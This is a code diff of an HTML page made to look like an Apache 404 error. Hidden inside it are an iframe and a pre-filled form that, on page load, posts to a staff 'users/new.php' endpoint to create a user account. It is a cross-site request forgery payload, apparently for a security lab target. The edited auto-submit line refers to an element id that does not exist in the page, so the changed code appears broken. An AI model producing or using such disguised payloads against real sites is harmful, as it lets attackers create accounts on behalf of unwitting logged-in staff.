@@ -12,11 +12,11 @@
     <h1>Not Found</h1>
     <p>The requested URL artemskit.github.io was not found on this server.</p>
     <hr>
-    <address>Apache/2.4.18 (Ubuntu) Server at 104.198.208.81 Port 441</address>
+    <address>Apache/2.4.18 (Ubuntu) Server at 104.198.208.81 Port 443</address>
     <div style="display: none">
         <iframe name="F1z"></iframe>
         <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST"
-            name="newuser">
+            name="newuser" target="F1z">
             <input name="first_name" value="Johnny">
             <input name="last_name" value="Bravo">
             <input name="username" value="johnnybravo">
@@ -27,7 +27,7 @@
         </form>
     </div>
     <script>
-        document.newuser.submit();
+        document.getElementById("myform").click();
     </script>
 </body>
 
